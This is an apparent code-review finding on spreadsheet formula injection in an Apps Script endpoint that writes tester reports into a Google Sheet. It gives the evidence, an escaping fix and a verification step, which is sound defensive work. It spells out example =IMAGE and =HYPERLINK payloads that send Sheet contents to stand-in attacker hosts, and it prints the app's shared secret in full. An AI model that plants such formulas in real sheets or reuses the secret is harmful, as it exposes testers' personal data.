# CR-087: Report endpoint writes tester-supplied text into the Sheet unescaped, so text starting with = + - @ becomes a spreadsheet formula

Part of the [October 5, 2026 code review](README.md). Read its instructions before fixing.

- **Severity:** medium
- **Category:** security
- **Verdict:** confirmed (skeptic: confirmed)
- **Location:** `scripts/weekly-report-endpoint.gs:107`
- **Also affects:** `scripts/weekly-report-endpoint.gs:103`; `scripts/weekly-report-endpoint.gs:127`; `scripts/weekly-report-endpoint.gs:230`; `app/js/weekly-send.js:54`; `scripts/weekly-report-endpoint.gs:100 (merged duplicate: Spreadsheet formula injection: strings from reports are written into the Sheet as formulas)`
- **Source:** reporting-platform-06, x-security-03

**What a user notices.** A problem note that starts with a dash shows as an error in the spreadsheet instead of the tester's words, and because the report password ships inside the public app, anyone can plant spreadsheet formulas in the project's private Sheet that run when it is opened.

**What is wrong.** appendRow/setValues interpret a string beginning with '=' (and '+', '-', '@') the way typed input is interpreted, i.e. as a formula. The note (free text typed by the tester), the tester name, install id, version and build are written raw. SHARED_SECRET is deliberately public (it ships in the app), so any third party can POST a payload whose note or testerName is e.g. =IMAGE("https://attacker/?"&JOIN(",",C2:C200)) into a Sheet that holds tester names, partner speech (problems tab) and raw payloads. Even without an attacker, a tester note such as '- the app froze' becomes a formula parse error in the cell.

**Evidence.**

```
scripts/weekly-report-endpoint.gs:100-109: `_problemSheet().appendRow([ ..., p.testerName || '(not set)', p.installId || '', p.appVersion || '', p.build || '', p.note || '', p.report || '' ]);`
scripts/weekly-report-endpoint.gs:127: `p.testerName || '(not set)',` (reports tab)
scripts/weekly-report-endpoint.gs:230: `p.testerName || '(not set)',` (weeks tab)
app/js/weekly-send.js:54: `export const SHARED_SECRET = 'u_mlqOZgElbxCB7732CAwSzC';` (public by design)
```

**How it happens.** POST {secret:'u_mlqOZgElbxCB7732CAwSzC', kind:'problem', note:'=HYPERLINK("https://evil.example","click")'} to the /exec URL; the problems tab now contains a live formula. Or a tester types '- it froze when I tapped Bye' as the note: the cell shows #ERROR!.

> **Verifier correction to the trigger:** The '=' prefix certainly becomes a formula. Whether a leading '-', '+' or '@' in a value written by appendRow is parsed as a formula (the '- it froze' → #ERROR! example) is less certain. Treat that part as possible, not established. Escaping all four prefixes is still harmless.

**Suggested fix.** Add `function _txt(v) { var s = String(v == null ? '' : v); return /^[=+\-@\t\r]/.test(s) ? "'" + s : s; }` and wrap every string that originates from the payload: testerName, installId, appVersion, build, sentAt, note, report (problems row), the corresponding reports-row strings (testerName, installId, appVersion, build, sentAt, _pairs/_errorContexts output) and the weeks-row testerName. Bump SCRIPT_VERSION and redeploy via Manage deployments (same URL).

**How to verify the fix.** POST a probe problem report whose note is '=1+1' and whose testerName is '-x'; the cells must show the literal text '=1+1' and '-x' (with the leading apostrophe hidden), not 2 or #ERROR!.

**Do not break.** The leading apostrophe changes nothing visible but evaluate-beta reads exported CSV; confirm the CSV export does not include the apostrophe (Sheets omits it). Keep row lengths equal to the headers.

**Design reference.** CLAUDE.md 'AS BUILT — item 4' ('THE SHEET HOLDS PERSONAL DATA'; the shared secret 'protects nothing already in the Sheet')

**Verification notes.** appendRow treats a string beginning with '=' as a formula; this is standard Apps Script behavior. The endpoint writes note, report, testerName, installId, version, build and sentAt as received (gs:100-109, 124-131, 230). SHARED_SECRET is public by design (weekly-send.js:54 says so explicitly), so any third party can post a problems row whose note begins with '=', for example =HYPERLINK or =IMAGE, into the Sheet that holds tester names and transcripts. No such item appears in TODO.md or the Security Review document.

<details><summary>Merged duplicate x-security-03: Spreadsheet formula injection: strings from reports are written into the Sheet as formulas</summary>

doPost and _writeWeeks write payload strings straight into cells with appendRow/setValues. Apps Script interprets a string beginning with '=' (and, like typed input, typically '+', '-' and '@') as a formula. Every string field is attacker-controllable because the shared secret ships inside the public app (SHARED_SECRET in weekly-send.js), so the secret check does not stop a third party. Fields written raw include testerName, installId, appVersion, build, sentAt, note, report, the _pairs()/_errorContexts() strings built from payload keys, and the weeks rows' install/tester values. A formula such as =IMAGE("https://attacker.example/x?"&ENCODEURL(problems!H2)) or =HYPERLINK(...) placed in the Sheet can exfiltrate the most sensitive tab (problem reports with transcripts) or phish the owner. A legitimate tester note like "- app froze when I tapped New 4" may also be parsed as a formula and stored as #ERROR!, losing their words.

Fix as proposed by that reviewer: In weekly-report-endpoint.gs add `function _txt(v) { if (typeof v !== 'string') return v; return /^[=+\-@\t\r]/.test(v) ? "'" + v : v; }` and apply it to every element of every row before writing: e.g. `_problemSheet().appendRow([...].map(_txt))`, `_sheet().appendRow([...].map(_txt))`, and `row = row.map(_txt)` in _writeWeeks. (The leading apostrophe makes Sheets store the value as plain text and is not shown.) Bump SCRIPT_VERSION and redeploy through Manage deployments.

</details>
